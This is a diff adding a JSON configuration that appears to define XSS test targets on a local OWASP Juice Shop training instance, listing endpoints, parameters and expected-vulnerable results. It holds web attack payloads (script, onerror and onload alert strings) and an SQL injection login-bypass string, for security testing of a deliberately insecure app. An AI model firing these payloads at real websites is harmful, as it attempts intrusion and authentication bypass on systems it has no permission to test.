@@ -1,0 +1,113 @@
+{
+  "_meta": {
+    "name": "OWASP Juice Shop",
+    "description": "OWASP Juice Shop — modern insecure web application for security training",
+    "image": "bkimminich/juice-shop:latest",
+    "port": 3000,
+    "target_url": "http://localhost:3000",
+    "category": "real-world",
+    "auth_required": false,
+    "notes": "Most XSS endpoints don't require auth. Admin endpoints (like /api/Challenges) are not needed for XSS testing."
+  },
+  "endpoints": [
+    {
+      "name": "juice-shop-search-reflected",
+      "category": "JuiceShop",
+      "url": "http://localhost:3000/rest/products/search",
+      "method": "GET",
+      "params": ["q"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "<script>alert(1)</script>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<img src=x onerror=alert(1)>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<svg onload=alert(1)>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "juice-shop-login-reflected",
+      "category": "JuiceShop",
+      "url": "http://localhost:3000/rest/user/login",
+      "method": "POST",
+      "params": ["email"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "<script>alert(1)</script>", "target_param": "email", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "' OR 1=1 --", "target_param": "email", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "test@test.com<script>alert(1)</script>", "target_param": "email", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "juice-shop-reviews-stored",
+      "category": "JuiceShop",
+      "url": "http://localhost:3000/api/Reviews",
+      "method": "POST",
+      "params": ["message"],
+      "expected": "Vuln",
+      "stored_mode": true,
+      "display_url": "http://localhost:3000/",
+      "form_fields": {
+        "message": "",
+        "author": "test",
+        "productId": 1
+      },
+      "payloads": [
+        {"payload": "<img src=x onerror=alert(1)>", "target_param": "message", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<script>alert(1)</script>", "target_param": "message", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<svg onload=alert(1)>", "target_param": "message", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "juice-shop-feedback-stored",
+      "category": "JuiceShop",
+      "url": "http://localhost:3000/api/Feedbacks",
+      "method": "POST",
+      "params": ["comment"],
+      "expected": "Vuln",
+      "stored_mode": true,
+      "display_url": "http://localhost:3000/",
+      "form_fields": {
+        "comment": "",
+        "rating": 3,
+        "UserId": 1
+      },
+      "payloads": [
+        {"payload": "<img src=x onerror=alert(1)>", "target_param": "comment", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<script>alert(1)</script>", "target_param": "comment", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "juice-shop-tracking-reflected",
+      "category": "JuiceShop",
+      "url": "http://localhost:3000/",
+      "method": "GET",
+      "params": ["q"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "notes": "Tracking ID reflected from X-User-Tracking header, but search query also reflects in page",
+      "payloads": [
+        {"payload": "<script>alert(1)</script>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<img src=x onerror=alert(1)>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "juice-shop-basket-stored",
+      "category": "JuiceShop",
+      "url": "http://localhost:3000/api/BasketItems",
+      "method": "POST",
+      "params": ["product"],
+      "expected": "Vuln",
+      "stored_mode": true,
+      "display_url": "http://localhost:3000/",
+      "form_fields": {
+        "product": "",
+        "BasketId": 1,
+        "quantity": 1
+      },
+      "payloads": [
+        {"payload": "<img src=x onerror=alert(1)>", "target_param": "product", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    }
+  ]
+}
